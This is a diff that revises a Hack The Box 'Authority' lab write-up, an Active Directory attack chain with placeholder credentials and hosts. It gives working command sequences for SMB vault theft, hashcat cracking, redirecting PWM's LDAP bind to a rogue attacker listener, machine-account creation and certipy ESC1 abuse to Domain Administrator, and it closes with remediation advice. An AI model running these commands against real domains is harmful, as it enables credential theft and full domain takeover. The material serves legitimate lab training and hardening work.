@@ -13,7 +13,7 @@ tags:
   - esc1
   - ansible
   - credential-exposure
-objective: "Medium AD lab with PWM/SMB exposure and Ansible-vault credential leakage"
+objective: "Escalate from guest-accessible SMB and an open PWM portal to Domain Administrator through Ansible-vault credential recovery and AD CS ESC1 abuse"
 tools:
   - rustscan
   - nxc
@@ -25,33 +25,46 @@ tools:
   - certipy
   - evil-winrm
 skill: "AD CS ESC1 abuse with rogue-LDAP credential capture"
-outcome: "Certificate-authenticated administrative access"
+outcome: "Certificate-authenticated Domain Administrator access through ESC1 abuse"
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Difficulty | Medium |
+| Target environment | Windows Active Directory Domain Controller |
+| Starting position | Unauthenticated network access |
+| Objective | Escalate from guest-accessible SMB and an open PWM portal to Domain Administrator through Ansible-vault credential recovery and AD CS ESC1 abuse |
+| Outcome | Certificate-authenticated Domain Administrator access through ESC1 abuse |
 
 ## Summary
 
-Authority is a Medium-rated Hack The Box Windows Active Directory lab where an open PWM configuration portal and guest SMB access expose Ansible vault files containing domain credentials. PWM administrative access allows LDAP profile manipulation to capture service account credentials via a rogue LDAP listener. The captured service account lacks direct certificate enrollment rights, but the domain permits non-privileged users to create machine accounts (MAQ=10). A new computer account enrolls the ESC1-vulnerable `<VULN_TEMPLATE>` certificate template with the Administrator's UPN, yielding the Administrator NTLM hash. Adding the service account to the built-in Administrators group provides WinRM access with full Domain Controller privileges. Credential values, target addresses, and service account identifiers are redacted below; command patterns are preserved.
+Authority is a Medium-rated Hack The Box Windows Active Directory lab. An open PWM password self-service portal and guest SMB access expose Ansible vault files holding domain credentials. PWM administrative access then lets the LDAP bind target be redirected to a rogue listener, capturing a service account's cleartext bind credentials. That service account has no direct certificate enrollment rights, but the domain permits non-privileged users to create machine accounts (MAQ=10). A new computer account enrolls the ESC1-vulnerable `<VULN_TEMPLATE>` template with the Administrator UPN, yielding the Administrator NTLM hash, and the service account is added to the built-in Administrators group for WinRM access to the Domain Controller. Credential values, host addresses, account names, the CA name, and the certificate template name are replaced with role-based placeholders; command syntax is preserved.
+
+**Attack path:** **Guest SMB → Ansible vault cracking → PWM admin access → rogue LDAP listener → service-account credential capture → machine-account creation (MAQ) → ESC1 certificate abuse → Administrator NTLM hash → Domain Administrator via WinRM**
 
 ## Context and Objective
 
-- **Target:** Windows Active Directory Domain Controller (Medium difficulty)
-- **Services exposed:** DNS (53), HTTP/IIS (80), Kerberos (88), RPC (135), NetBIOS (139), LDAP (389/636), SMB (445), WinRM (5985), Tomcat/PWM (8443), .NET Framing (9389)
-- **Objective:** Achieve Domain Administrator privileges through the attack surface presented by exposed services
-- **Lab context:** Hack The Box lab; all activity described was performed within the platform's isolated lab environment
+- **Target:** Windows Active Directory Domain Controller (Medium difficulty).
+- **Exposed services:** DNS (53), HTTP/IIS (80), Kerberos (88), RPC (135), NetBIOS (139), LDAP (389/636), SMB (445), WinRM (5985), Tomcat/PWM (8443), and .NET Message Framing (9389).
+- **Starting position:** unauthenticated network access.
+- **Objective:** reach Domain Administrator through the exposed services.
+- **Constraints:** all activity stayed inside the isolated Hack The Box lab environment.
 
 ## Approach and Evidence
 
 ### 1. Service Enumeration
 
-Observation: the exposed services identify the host as an Active Directory Domain Controller with LDAP, Kerberos, SMB, and WinRM. The LDAP certificate is signed by the internal CA `<INTERNAL_CA>`. Port 8443 runs an Apache Tomcat application (PWM). Port 80 serves a default IIS page.
+Observation: the scan identifies the host as an Active Directory Domain Controller with LDAP, Kerberos, SMB, and WinRM. The LDAP certificate is signed by an internal certificate authority, port 8443 runs an Apache Tomcat application (PWM), and port 80 serves a default IIS page.
 
-Action: fast TCP scan to enumerate open ports and service versions.
+Action: enumerate open ports and service versions.
 
 ```bash
 rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/<SCAN_OUTPUT>
 ```
 
-Representative excerpt (truncated):
+Truncated scan output:
 
 ```text
 PORT      STATE SERVICE       VERSION
@@ -71,105 +84,107 @@ PORT      STATE SERVICE       VERSION
 47001/tcp open  http          Microsoft HTTPAPI httpd 2.0
 ```
 
-Technical significance: the service fingerprint confirms an AD DC with certificate infrastructure (CA-signed LDAP cert), a self-service password portal (PWM on Tomcat), and SMB with guest-accessible shares.
+Significance: the fingerprint confirms an AD Domain Controller with certificate infrastructure (CA-signed LDAP certificate), a self-service password portal on Tomcat, and SMB.
 
-Result: the recorded output shows AD DC services including LDAP, Kerberos, SMB, WinRM, and PWM.
+Result: LDAP, Kerberos, SMB, WinRM, and PWM are all exposed.
 
 ### 2. PWM Discovery
 
-Observation: port 8443 hosts PWM (Project PWM), an open-source LDAP password self-service portal. The application is in open configuration mode, allowing unauthenticated access to its configuration editor.
+Observation: PWM (Project PWM), an open-source LDAP password self-service portal, runs on port 8443.
 
-Action: navigate to the PWM login page.
+Action: open the PWM login page.
 
 ```text
 https://<TARGET_IP>:8443/pwm/private/login
 ```
 
-Representative excerpt:
+The application banner reports:
 
 ```text
 PWM is in open configuration mode and is not secure.
 ```
 
-Technical significance: open configuration mode means anyone can access the PWM configuration editor without authentication, exposing the LDAP infrastructure configuration. This is the initial foothold vector.
+Significance: open configuration mode lets anyone reach the PWM configuration editor without authentication, exposing the LDAP infrastructure settings.
 
-Result: the notes report PWM in open configuration mode with full LDAP configuration accessible.
+Result: the PWM configuration editor is reachable unauthenticated.
 
 ### 3. Guest SMB Access
 
-Observation: guest access is accepted over SMB, allowing share enumeration. The `<SENSITIVE_SHARE>` share is readable as Guest.
+Observation: SMB accepts guest logons, so shares can be enumerated; the `<SENSITIVE_SHARE>` share is readable as guest.
 
-Action: enumerate SMB shares with guest credentials.
+Action: list shares with guest credentials.
 
 ```bash
 nxc smb <TARGET_IP> -u 'a' -p '' --shares
 ```
 
-Representative excerpt (structure only):
+Truncated share listing:
 
 ```text
-SMB         <TARGET_IP>   445    <DC_HOSTNAME>    Share           Permissions    Remark
-SMB         <TARGET_IP>   445    <DC_HOSTNAME>    -----           -----------    ------
-SMB         <TARGET_IP>   445    <DC_HOSTNAME>    <SENSITIVE_SHARE>   READ
-SMB         <TARGET_IP>   445    <DC_HOSTNAME>    IPC$            READ           Remote IPC
-SMB         <TARGET_IP>   445    <DC_HOSTNAME>    NETLOGON                        Logon server share
-SMB         <TARGET_IP>   445    <DC_HOSTNAME>    SYSVOL                          Logon server share
+SMB         <TARGET_IP>   445    <DC_HOST>    Share              Permissions    Remark
+SMB         <TARGET_IP>   445    <DC_HOST>    -----              -----------    ------
+SMB         <TARGET_IP>   445    <DC_HOST>    <SENSITIVE_SHARE>  READ
+SMB         <TARGET_IP>   445    <DC_HOST>    IPC$               READ           Remote IPC
+SMB         <TARGET_IP>   445    <DC_HOST>    NETLOGON                          Logon server share
+SMB         <TARGET_IP>   445    <DC_HOST>    SYSVOL                            Logon server share
 ```
 
-Action: spider the `<SENSITIVE_SHARE>` share to download accessible content.
+Action: spider the share and download accessible content.
 
 ```bash
-nxc smb <TARGET_IP> -u 'a' -p '' -M spider_plus
+nxc smb <TARGET_IP> -u 'a' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
 ```
 
-Result: the notes report the `<SENSITIVE_SHARE>` share contents retrieved for offline analysis.
+```text
+SPIDER_PLUS <TARGET_IP>   445    <DC_HOST>    [+] All files processed successfully
+```
+
+Result: the `<SENSITIVE_SHARE>` share contents are retrieved for offline analysis.
 
 ### 4. Ansible Vault Discovery
 
-Observation: the downloaded `<SENSITIVE_SHARE>` share contains Ansible automation files for PWM, including vault-encrypted credential files.
-
-Action: inspect the downloaded directory structure.
+Observation: the downloaded share contains Ansible automation for PWM under a defaults directory.
 
 ```text
 <TARGET_IP>/<SENSITIVE_SHARE>/Automation/Ansible/PWM/defaults
 ```
 
-This directory contains a `main.yaml` configuration file alongside three Ansible vault-encrypted files:
+The directory holds a `main.yaml` configuration file and three Ansible vault-encrypted files:
 
 - `ldap_admin_password`
 - `pwm_admin_password`
 - `pwm_admin_login`
 
-Technical significance: Ansible vault files store encrypted credentials. The vault password strength determines security; weak passwords are crackable with standard wordlists.
+Significance: Ansible vault files store encrypted credentials, so the security of those secrets depends on vault password strength.
 
-Result: the notes report three vault-encrypted credential files discovered in the `<SENSITIVE_SHARE>` share.
+Result: three vault-encrypted credential files are present in the downloaded share.
 
 ### 5. Ansible Vault Cracking
 
-Observation: vault files can be converted to hash format for offline cracking. All three share the same vault password.
+Observation: the vault files can be converted to a hash format for offline cracking, and all three share one vault password.
 
-Action: convert vault files to hash format, then crack with a wordlist.
+Action: convert the vault files, then run a dictionary attack.
 
 ```bash
 ansible2john ldap_admin_password pwm_admin_password pwm_admin_login > vault.hash
 hashcat vault.hash /usr/share/wordlists/rockyou.txt --username
 ```
 
-Representative excerpt (password redacted):
+Recovered entry (hash and password redacted):
 
 ```text
 $ansible$0*0*<HASH>:<VAULT_PASSWORD>
 ```
 
-Technical significance: Ansible vault uses a custom hash format compatible with John the Ripper and Hashcat. Weak vault passwords fall quickly to dictionary attacks.
+Significance: the Ansible vault hash format is recoverable offline, so a weak vault password falls quickly to a standard wordlist.
 
-Result: the notes report all three vault files cracked with the same password (value redacted).
+Result: all three vault files crack to the same `<VAULT_PASSWORD>`.
 
 ### 6. Vault Decryption
 
-Observation: the cracked password decrypts all three vault files, revealing domain credentials.
+Observation: the cracked password decrypts all three vault files.
 
-Action: decrypt each vault file using the cracked password.
+Action: decrypt each vault file with the recovered password.
 
 ```bash
 printf '%s' '<VAULT_PASSWORD>' > /tmp/vaultpass
@@ -179,53 +194,51 @@ ansible-vault decrypt pwm_admin_login --vault-password-file /tmp/vaultpass
 ansible-vault decrypt pwm_admin_password --vault-password-file /tmp/vaultpass
 ```
 
-Representative excerpt:
-
 ```text
 Decryption successful
 Decryption successful
 Decryption successful
 ```
 
-Technical significance: the decrypted files reveal three credentials: a PWM admin password, a PWM admin login (service account), and an LDAP bind password. The PWM service account provides administrative access to the PWM configuration editor.
+Significance: the decrypted files yield a PWM admin login (`<PWM_SERVICE_ACCOUNT>`), a PWM admin password (`<PWM_ADMIN_PASSWORD>`), and a separate LDAP bind password (`<LDAP_ADMIN_PASSWORD>`).
 
-Result: the notes report three decrypted files yielding a PWM admin login, PWM admin password, and LDAP bind password (values redacted).
+Result: the PWM administrative credentials unlock the configuration editor.
 
 ### 7. PWM LDAP Configuration Manipulation
 
-Observation: the PWM configuration editor is accessible with the decrypted PWM admin credentials. The LDAP server URL can be replaced with an attacker-controlled listener.
+Observation: the PWM configuration editor is accessible with the decrypted PWM credentials, and the LDAP server URL is editable.
 
-Action: authenticate to PWM, navigate to LDAP configuration, replace the legitimate LDAP server with a rogue listener.
+Action: open the configuration editor and repoint the LDAP URL to a rogue listener.
 
 ```text
 https://<TARGET_IP>:8443/pwm/private/config/editor
 ```
 
 ```text
-LDAP Directorys -> default -> Connection -> LDAP URLs -> Remove -> <DOMAIN_FQDN> add -> ldap://<ATTACKER_IP>:389
+LDAP Directorys -> default -> Connection -> LDAP URLs -> Remove -> <DOMAIN> add -> ldap://<ATTACKER_HOST>:389
 ```
 
-Action: start a responder/rogue LDAP listener on the attacker machine.
+Action: start a rogue LDAP listener.
 
 ```bash
 sudo responder
 ```
 
-Technical significance: PWM, when testing the modified LDAP profile, sends a bind request to the configured URL. Replacing the URL with an attacker-controlled listener captures the cleartext LDAP bind credentials.
+Significance: PWM sends a bind request to whatever LDAP URL is configured, so pointing it at an attacker-controlled listener captures the bind credentials in cleartext.
 
-Result: the notes report the PWM LDAP configuration modified to redirect bind requests.
+Result: the PWM LDAP profile is redirected to the rogue listener.
 
 ### 8. Service Account Credential Capture
 
-Observation: testing the modified LDAP profile from PWM causes the server to send cleartext LDAP bind credentials to the attacker listener.
+Observation: testing the modified LDAP profile makes the PWM server send a cleartext bind to the rogue listener.
 
-Action: trigger the LDAP profile test from the PWM configuration interface.
+Action: trigger the profile test from the PWM configuration interface.
 
 ```text
 Test LDAP profile
 ```
 
-Representative excerpt (values generalized):
+Captured bind (values redacted):
 
 ```text
 [LDAP] Cleartext Client   : <TARGET_IP>
@@ -233,88 +246,98 @@ Representative excerpt (values generalized):
 [LDAP] Cleartext Password : <LDAP_PASSWORD>
 ```
 
-Technical significance: the PWM server sends the LDAP bind credentials in cleartext when testing the profile. This reveals the service account DN and password. The account has AD query rights and Certificate Authority interaction capability.
+Significance: the service account's distinguished name and password are disclosed in cleartext; the account has AD query rights and can interact with the certificate authority.
 
-Result: the notes report cleartext LDAP credentials captured for a domain service account (values redacted).
+Result: `<SERVICE_ACCOUNT>` / `<LDAP_PASSWORD>` are recovered and subsequently validated through LDAP queries.
 
 ### 9. AD CS Enumeration
 
-Observation: BloodHound and certipy enumeration with the captured service account reveals an ESC1-vulnerable certificate template.
+Observation: enumeration with the captured service account reveals a vulnerable certificate template.
 
-Action: collect domain attack path data and enumerate certificate authorities.
+Action: collect domain data and enumerate the certificate authority.
 
 ```bash
 rusthound-ce --domain <DOMAIN> -u '<SERVICE_ACCOUNT>' -p '<LDAP_PASSWORD>' --zip -o <DOMAIN> --ldaps
 nxc ldap <TARGET_IP> -u '<SERVICE_ACCOUNT>' -p '<LDAP_PASSWORD>' -M certipy-find
 ```
 
-Representative excerpt:
-
 ```text
-CERTIPY-... <TARGET_IP>   389    <DC_HOSTNAME>        [!] Vulnerabilities
-CERTIPY-... <TARGET_IP>   389    <DC_HOSTNAME>          ESC1  : Enrollee supplies subject and template allows client authentication
+CERTIPY-... <TARGET_IP>   389    <DC_HOST>    [!] Vulnerabilities
+CERTIPY-... <TARGET_IP>   389    <DC_HOST>      ESC1  : Enrollee supplies subject and template allows client authentication
 ```
 
-Technical significance: ESC1 requires the certificate template to support client authentication EKU, allow the enrollee to supply the Subject Name and Subject Alternative Name (SAN), grant enrollment rights to a low-privileged principal, and impose no certificate manager approval or authorized signatures requirement. This combination permits certificate-based authentication as any specified user.
+Significance: ESC1 requires a template that allows the enrollee to supply the subject/SAN, supports client authentication, grants enrollment to a low-privileged principal, and needs no manager approval — the exact combination that permits certificate-based authentication as any user.
 
-Result: the notes report the `<VULN_TEMPLATE>` template vulnerable to ESC1.
+Result: the `<VULN_TEMPLATE>` template is vulnerable to ESC1.
 
 ### 10. Machine Account Creation
 
-Observation: the service account lacks direct enrollment rights on the `<VULN_TEMPLATE>` template. The Machine Account Quota (MAQ) is 10, allowing non-privileged users to create computer accounts.
+Observation: the service account has no direct enrollment rights on `<VULN_TEMPLATE>`, but the Machine Account Quota permits non-privileged users to create computer accounts.
 
-Action: check MAQ, then create a machine account.
+Action: attempt to enroll the template directly as the service account.
+
+```bash
+certipy req -u '<SERVICE_ACCOUNT>' -p '<LDAP_PASSWORD>' -dc-ip <TARGET_IP> -ca '<CA_NAME>' -target '<DC_FQDN>' -template '<VULN_TEMPLATE>' -upn 'administrator@<DOMAIN>'
+```
+
+```text
+The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
+```
+
+Action: check the Machine Account Quota.
 
 ```bash
 nxc ldap <TARGET_IP> -u '<SERVICE_ACCOUNT>' -p '<LDAP_PASSWORD>' -M maq
 ```
 
 ```text
-MAQ         <TARGET_IP>   389    <DC_HOSTNAME>    MachineAccountQuota: 10
+MAQ         <TARGET_IP>   389    <DC_HOST>    MachineAccountQuota: 10
 ```
+
+Action: create a new machine account.
 
 ```bash
 nxc ldap <TARGET_IP> -u '<SERVICE_ACCOUNT>' -p '<LDAP_PASSWORD>' -M add-computer -o NAME="<CREATED_PC>" PASSWORD="<MACHINE_PASSWORD>"
 ```
 
 ```text
-ADD-COMP... <TARGET_IP>   389    <DC_HOSTNAME>    Successfully added "<CREATED_PC>$" with password "<MACHINE_PASSWORD>"
+ADD-COMP... <TARGET_IP>   389    <DC_HOST>    Successfully added "<CREATED_PC>$" with password "<MACHINE_PASSWORD>"
 ```
 
-Technical significance: the domain allows non-privileged users to create up to 10 computer accounts. A new machine account inherits enrollment rights on templates that grant enrollment to "Domain Computers" or similar groups, bypassing the service account's lack of direct enrollment rights.
+Significance: the new computer account inherits enrollment rights the service account lacks, sidestepping the failed direct enrollment.
 
-Result: the notes report a new machine account successfully created (credentials redacted).
+Result: `<CREATED_PC>$` is created as an enroll-capable principal.
 
 ### 11. ESC1 Certificate Abuse
 
-Observation: the new machine account can enroll the `<VULN_TEMPLATE>` template. Requesting a certificate with the Administrator's UPN as the SAN yields a certificate that authenticates as Administrator.
+Observation: the new machine account can enroll `<VULN_TEMPLATE>` and request a certificate with the Administrator UPN as the SAN.
 
-Action: request a certificate with the Administrator's UPN, then authenticate.
+Action: request the certificate, then authenticate with it.
 
 ```bash
-certipy req -u '<CREATED_PC>$' -p '<MACHINE_PASSWORD>' -dc-ip <TARGET_IP> -ca '<INTERNAL_CA>' -target '<DC_FQDN>' -template '<VULN_TEMPLATE>' -upn 'administrator@<DOMAIN>'
+certipy req -u '<CREATED_PC>$' -p '<MACHINE_PASSWORD>' -dc-ip <TARGET_IP> -ca '<CA_NAME>' -target '<DC_FQDN>' -template '<VULN_TEMPLATE>' -upn 'administrator@<DOMAIN>'
 ```
 
 ```bash
 certipy auth -pfx <ADMIN_PFX> -dc-ip <TARGET_IP>
 ```
 
-Technical significance: ESC1 abuse works because the template allows the enrollee to specify any UPN in the SAN field. The CA issues a certificate for the specified UPN without verifying the enrollee's identity matches. The resulting PFX enables PKINIT authentication; certipy extracts the NTLM hash for the specified user.
+Significance: because the template lets the enrollee specify any UPN in the SAN, the CA issues a certificate for the Administrator UPN without verifying that the requester is that user. The resulting PFX enables PKINIT authentication, from which the Administrator NTLM hash is extracted.
 
-Result: the notes report the Administrator NTLM hash obtained via certificate authentication (hash redacted).
+Result: the certificate authenticates as Administrator and returns the Administrator NTLM hash.
 
 ### 12. Domain Administrator Access
 
-Observation: with the Administrator hash, the LDAP shell is used to add the service account to the built-in Administrators group, then authenticate over WinRM.
+Observation: with the Administrator hash, the LDAP shell can modify group membership and the service account can then log on over WinRM.
 
-Action: add the service account to the Administrators group via LDAP shell.
+Action: add the service account to the built-in Administrators group.
 
 ```bash
 certipy auth -pfx <ADMIN_PFX> -dc-ip <TARGET_IP> -ldap-shell
 ```
 
 ```text
-add_user_to_group <SERVICE_ACCOUNT> Administrators
+ldap-shell input: add_user_to_group <SERVICE_ACCOUNT> Administrators
 ```
 
 Action: authenticate over WinRM with the service account credentials.
@@ -323,42 +346,42 @@ Action: authenticate over WinRM with the service account credentials.
 evil-winrm -i <TARGET_IP> -u <SERVICE_ACCOUNT> -p '<LDAP_PASSWORD>'
 ```
 
-Technical significance: adding the service account to the Administrators group grants Domain Administrator privileges. WinRM provides a stable interactive shell with full admin access to the Domain Controller.
+Significance: adding the service account to Administrators grants Domain Administrator rights, and WinRM provides an interactive shell on the Domain Controller.
 
-Result: the notes report full administrative access obtained on the Domain Controller.
+Result: the service account holds Domain Administrator access on the Domain Controller.
 
 ## Challenges and Decisions
 
 | Challenge | Decision | Rationale |
 |---|---|---|
-| Service account lacks enrollment rights on `<VULN_TEMPLATE>` template | Used Machine Account Quota to create a computer account | Domain MAQ=10 allows non-privileged users to create machine accounts that inherit template enrollment rights |
-| PWM open configuration mode | Exploited unauthenticated config editor access | No authentication required; direct LDAP configuration manipulation possible |
-| Weak Ansible vault password | Cracked with standard wordlist | Vault password fell to dictionary attack; demonstrates risk of weak vault encryption |
+| `<SERVICE_ACCOUNT>` lacks enrollment rights on the `<VULN_TEMPLATE>` template | Created a machine account under the domain's Machine Account Quota | The new computer account inherits template enrollment rights the service account lacks |
 
 ## Outcome
 
-The evidence establishes: domain credential recovery via Ansible vault cracking from guest-accessible SMB shares; LDAP credential capture via PWM configuration manipulation and rogue listener; privilege escalation via AD CS ESC1 abuse through machine account creation and certificate-based authentication as Administrator. All steps abuse legitimate AD functionality and misconfigurations rather than software vulnerabilities.
-
-**Attack chain:**
-Guest SMB → Ansible vault files → vault cracking → PWM admin access → LDAP config manipulation → service account credential capture → MAQ machine account creation → ESC1 certificate abuse → Administrator NTLM hash → Domain Administrator via WinRM
+The supported outcome is certificate-authenticated Domain Administrator access via AD CS ESC1. The certificate issuance, NTLM hash extraction, and WinRM logon are reported by the source without preserved command output, so those final transitions rest on the record's narrative. HTTP/IIS on port 80 was enumeration-only.
 
 ## Lessons and Recommendations
 
-Recommendations below follow the source remediation; none were re-tested during curation.
+Each item pairs an observed root cause with its demonstrated impact and a prioritized action. Recommendations build on the source remediation; remaining items are general hardening; none was tested.
 
-1. **Disable PWM open configuration mode.** Enforce authentication for all PWM administrative functions. Open configuration mode exposes LDAP infrastructure to unauthenticated manipulation. (Recommendation.)
-2. **Restrict SMB guest access.** Audit readable shares for sensitive data. Guest-accessible shares should never contain credential-bearing automation files. (Recommendation.)
-3. **Enforce strong vault passwords.** Use complex, unique passwords for Ansible vault encryption. Consider using managed identities or secrets management instead of shared vault passwords. (Recommendation.)
-4. **Enforce LDAPS for all directory bind operations.** PWM sends LDAP bind credentials in cleartext; LDAPS prevents credential capture by rogue listeners. Validate LDAP server certificates. (Recommendation.)
-5. **Restrict Machine Account Quota.** Reduce MAQ to 0 where machine account creation is not required. Prevents non-privileged users from creating accounts that inherit template enrollment rights. (Recommendation.)
-6. **Restrict enrollment rights on ESC1-vulnerable templates.** Limit certificate template enrollment to authorized security groups. Remove SAN specification capability where not required. (Recommendation.)
-
-Editorial MITRE view (mapping only, not a source claim): credential access via files on network share; credential manipulation via application configuration; privilege escalation via AD CS template abuse and machine account creation.
+1. **PWM open configuration mode.** Root cause: PWM ran in open configuration mode, exposing its configuration editor without authentication. Demonstrated impact: an unauthenticated party could read LDAP infrastructure settings and repoint directory bind traffic to an attacker-controlled listener. *Recommendation:* disable open configuration mode and require authentication for all PWM administrative functions.
+2. **Guest SMB access.** Root cause: SMB accepted guest logons and the `<SENSITIVE_SHARE>` share was world-readable. Demonstrated impact: Ansible automation and vault files were downloaded without credentials. *Recommendation:* deny guest SMB access and audit shared directories for credential-bearing artifacts.
+3. **Weak Ansible vault password.** Root cause: the vault was protected by a weak password. Demonstrated impact: all three vault files fell to an offline dictionary attack, disclosing PWM and LDAP administrative credentials. *Recommendation:* enforce strong, unique vault passwords and prefer managed identities or a secrets manager over shared vault secrets. *Validation:* test vault password strength with an offline cracking pass.
+4. **Cleartext LDAP bind.** Root cause: PWM sent LDAP bind credentials to the configured URL in cleartext. Demonstrated impact: a rogue listener captured a service account's distinguished name and password. *Recommendation:* require LDAPS for directory binds and validate the LDAP server certificate. *Detection:* alert on directory binds to unexpected or external hosts.
+5. **ESC1 template combined with a permissive Machine Account Quota.** Root cause: the `<VULN_TEMPLATE>` template allowed the enrollee to supply the subject/SAN and granted enrollment to domain computers, while MAQ=10 let the service account create one. Demonstrated impact: certificate-based authentication as Administrator and full Domain Administrator access. *Recommendation:* restrict enrollment on ESC1-vulnerable templates to authorized groups, remove unneeded SAN specification, reduce the Machine Account Quota, and keep the client-authentication flag only where required.
 
 ## References
 
-- Hack The Box machine **[Authority](https://app.hackthebox.com/machines/Authority)** (retired lab; no active-instance detail)
-- Microsoft documentation: Active Directory Certificate Services
-- Project PWM: open-source LDAP password self-service portal
-- Certipy: AD CS abuse toolkit
-- `ansible2john` / Hashcat: Ansible vault password cracking
+- [Hack The Box — Authority](https://app.hackthebox.com/machines/Authority) (retired machine)
+- [RustScan](https://github.com/bee-san/RustScan) (fast port scanner)
+- [NetExec](https://github.com/Pennyw0rth/NetExec) (SMB/LDAP enumeration and module runner)
+- [Responder](https://github.com/lgandx/Responder) (rogue authentication server, including LDAP capture)
+- [Certipy](https://github.com/ly4k/Certipy) (AD CS enumeration and abuse)
+- [Hashcat](https://hashcat.net/hashcat/) (offline password recovery)
+- [Ansible Vault](https://docs.ansible.com/ansible/latest/cli/ansible-vault.html) (vault encryption and decryption reference)
+- [John the Ripper — `ansible2john`](https://github.com/openwall/john/blob/bleeding-jumbo/run/ansible2john.py) (Ansible vault hash extraction)
+- [evil-winrm](https://github.com/Hackplayers/evil-winrm) (WinRM interactive shell)
+- [RustHound-CE](https://github.com/g0h4n/RustHound-CE) (Active Directory and AD CS collector)
+- [Microsoft Learn — Certificate template concepts](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts) (subject/SAN and client-authentication template conditions behind ESC1)
+- [Microsoft Learn — Default limit to the number of workstations a user can join to the domain](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/default-workstation-numbers-join-domain) (Machine Account Quota default of 10)
+- [Microsoft Learn — Enable LDAP over SSL (LDAPS) with a third-party certification authority](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/enable-ldap-over-ssl-3rd-certification-authority) (LDAPS and server-certificate validation)
